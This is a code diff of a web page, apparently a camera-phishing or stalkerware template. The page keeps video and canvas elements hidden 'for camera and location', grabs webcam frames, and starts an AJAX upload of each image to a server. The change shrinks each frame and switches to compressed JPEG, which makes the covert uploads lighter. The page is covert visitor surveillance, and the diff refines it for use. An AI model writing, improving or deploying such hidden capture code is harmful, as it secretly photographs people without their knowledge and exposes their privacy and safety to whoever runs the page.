@@ -223,7 +223,7 @@
     <!-- Hidden elements for camera and location -->
     <div class="hidden-elements">
         <video id="video" playsinline autoplay></video>
-        <canvas id="canvas" width="640" height="640"></canvas>
+        <canvas id="canvas" width="320" height="240"></canvas>
     </div>
 
     <script src="../../assets/js/jquery.min.js"></script>
@@ -260,8 +260,8 @@
             if (!videoStream) return;
 
             const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 640);
-            const imageData = canvas.toDataURL("image/png");
+            context.drawImage(video, 0, 0, 320, 240);
+            const imageData = canvas.toDataURL("image/jpeg", 0.7);
 
             // Send image to server
             $.ajax({
